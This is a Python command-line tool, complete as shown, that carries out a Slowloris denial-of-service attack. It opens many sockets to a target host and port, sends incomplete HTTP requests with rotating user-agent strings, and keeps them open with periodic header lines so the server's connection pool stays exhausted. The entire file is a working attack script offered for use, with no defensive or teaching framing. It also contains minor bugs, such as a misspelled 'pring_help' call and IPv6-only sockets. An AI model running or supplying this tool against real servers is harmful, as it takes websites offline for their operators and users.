#!/usr/bin/python3
import socket 
import argparse 
import sys 
import random
import time
import logging

#Parsing command line arguments 
parser = argparse.ArgumentParser(description="This tool executes a Slowloring attack against the specified hostname or IP address") 
parser.add_argument('hostname', help="target hostname or IP address") 
parser.add_argument('-p', '--port', help="the target port number", default=80, type=int) 
parser.add_argument('-c', '--count', help="number of sockets used for the attack", default=100, type=int) 
parser.add_argument('-rt', '--refreshtime', help="keep-alive interval of sockets in seconds", default=10, type=int)
parser.add_argument('-t', '--time', help="attack time in seconds", default=120, type=int)
parser.add_argument('-ua', '--useragent', help="activate to NOT use random user agents", action="store_true")
parser.add_argument('-v','--verbose', help="verbose output", action="store_true")
args = parser.parse_args() 

if not args.hostname: 
        print('Target hostname or IP address required!') 
        parser.pring_help() 
        sys.exit(1) 

socket_list = [] 

user_agents = [ "Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36",
                "Mozilla/5.0 (Linux; Android 5.1.1; SM-G928X Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36",
                "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586",
                "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 6P Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36",
                "Mozilla/5.0 (Linux; Android 6.0.1; E6653 Build/32.2.A.0.253) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36",
                "Mozilla/5.0 (Linux; Android 6.0; HTC One M9 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36",
                "Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",
                "Mozilla/5.0 (Linux; Android 6.0.1; SGP771 Build/32.2.A.0.253; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",
                "Mozilla/5.0 (Linux; Android 5.1.1; SHIELD Tablet Build/LMY48C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Safari/537.36",
                "Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T550 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Safari/537.36",
                "Mozilla/5.0 (Linux; Android 4.4.3; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/47.1.79 like Chrome/47.0.2526.80 Safari/537.36",
                "Mozilla/5.0 (Linux; Android 5.0.2; LG-V410/V41020c Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/34.0.1847.118 Safari/537.36",
                "Mozilla/5.0 (CrKey armv7l 1.5.16041) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.0 Safari/537.36",
                "Mozilla/5.0 (Linux; U; Android 4.2.2; he-il; NEO-X5-116A Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30",
                "Mozilla/5.0 (Linux; Android 4.2.2; AFTB Build/JDQ39) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.173 Mobile Safari/537.22",
                "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Nexus Player Build/MMB29T)",
                "Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
                "Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9",
                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36",
                "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1",
]

#Setting up logger
logging.basicConfig(format='%(asctime)s %(name)s: %(message)s', datefmt='%m/%d/%Y %I:%M:%S ')
logger = logging.getLogger('Loris')

if args.verbose:
        logger.setLevel(logging.DEBUG)
else:
        logger.setLevel(logging.INFO)

        
def create_socket(ip): 
        port = args.port

        s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((ip, port))

        s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
        if not args.useragent:
                s.send("{}\r\n".format(random.choice(user_agents)).encode("utf-8"))
        else:
                s.send("{}\r\n".format("Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36").encode("utf-8"))
        s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))

        return s
        
def keep_alive(s): 
        try:
                s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
        except socket.error:
                socket_list.remove(s)
     
def main(): 
        ip = args.hostname
        socket_count = args.count
        attack_time = args.time
        refresh_time = args.refreshtime

        logger.info('Starting Slow Loris against {} on port {} using {} sockets'.format(ip, args.port, socket_count))
        logger.info('Attack time is set to {}s, the connection update interval is {}s'.format(attack_time, refresh_time))
        
        logger.debug('Initiating of sockets.')
        #Initiating sockets
        for i in range(socket_count): 
                try: 
                        s = create_socket(ip) 
                except socket.error: 
                        break 
                socket_list.append(s) 

        logger.debug('{} sockets successfully started!'.format(len(socket_list)))

        while True: 
                #keep-alive sockets 
                for s in socket_list: 
                        keep_alive(s) 
                
                #recreating closed sockets 
                for i in range(socket_count - len(socket_list)): 
                        try: 
                                s = create_socket(ip) 
                                if s: 
                                        socket_list.append(s) 
                                        logger.debug('Closed socket recreated.')
                        except socket.error: 
                                break 

                time.sleep(refresh_time)
                attack_time -= refresh_time
                if attack_time < 0:
                        break
        logger.info('Terminating attack on {}.'.format(ip))
        logger.info('Closing application.')
        sys.exit(1)


if __name__ == "__main__": 
        main()